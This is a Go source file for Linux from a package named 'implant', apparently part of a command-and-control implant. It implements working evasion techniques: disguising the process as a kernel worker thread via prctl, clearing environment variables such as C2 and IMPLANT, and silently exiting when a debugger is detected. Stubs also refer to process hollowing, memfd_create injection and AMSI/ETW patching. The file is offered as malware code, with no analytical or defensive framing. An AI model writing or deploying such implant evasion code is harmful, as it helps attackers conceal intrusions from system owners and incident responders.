//go:build linux

package implant

import (
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

// InitEvasion runs Linux-specific evasion techniques.
func InitEvasion() []string {
	var results []string

	if err := hideProcess(); err != nil {
		results = append(results, fmt.Sprintf("Process hide: FAILED (%v)", err))
	} else {
		results = append(results, "Process hide: OK")
	}

	if err := clearEnv(); err != nil {
		results = append(results, fmt.Sprintf("Env cleanup: FAILED (%v)", err))
	} else {
		results = append(results, "Env cleanup: OK")
	}

	if err := antiDebug(); err != nil {
		results = append(results, fmt.Sprintf("Anti-debug: FAILED (%v)", err))
	} else {
		results = append(results, "Anti-debug: OK")
	}

	return results
}

// hideProcess renames /proc/self/comm to look like a legitimate process.
func hideProcess() error {
	// Overwrite argv[0] equivalent via prctl PR_SET_NAME
	name := []byte("[kworker/0:1]\x00") // Looks like a kernel worker thread
	_, _, errno := syscall.RawSyscall(syscall.SYS_PRCTL, 15, uintptr(unsafe.Pointer(&name[0])), 0) // PR_SET_NAME = 15
	if errno != 0 {
		return fmt.Errorf("prctl PR_SET_NAME: %v", errno)
	}
	return nil
}

// clearEnv removes suspicious environment variables that might identify the implant.
func clearEnv() error {
	suspicious := []string{"PHANTOM", "C2", "IMPLANT", "LISTENER", "CALLBACK"}
	for _, key := range suspicious {
		os.Unsetenv(key)
	}
	// Also clear LD_PRELOAD if set (sometimes used for injection detection)
	os.Unsetenv("LD_PRELOAD")
	return nil
}

// antiDebug checks for debuggers and tracing.
func antiDebug() error {
	// Check /proc/self/status for TracerPid
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return nil // Can't check, not fatal
	}

	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "TracerPid:") {
			pid := strings.TrimSpace(strings.TrimPrefix(line, "TracerPid:"))
			if pid != "0" {
				// Being traced — exit silently
				os.Exit(0)
			}
		}
	}

	return nil
}

// ProcessHollow is not implemented on Linux (uses different techniques).
func ProcessHollow(hostProcess string, payload []byte) error {
	return fmt.Errorf("process hollowing not available on Linux — use memfd_create injection instead")
}

// PatchAMSI is a no-op on Linux (AMSI is Windows-only).
func PatchAMSI() error { return nil }

// PatchETW is a no-op on Linux (ETW is Windows-only).
func PatchETW() error { return nil }

// UnhookNtdll is a no-op on Linux.
func UnhookNtdll() error { return nil }
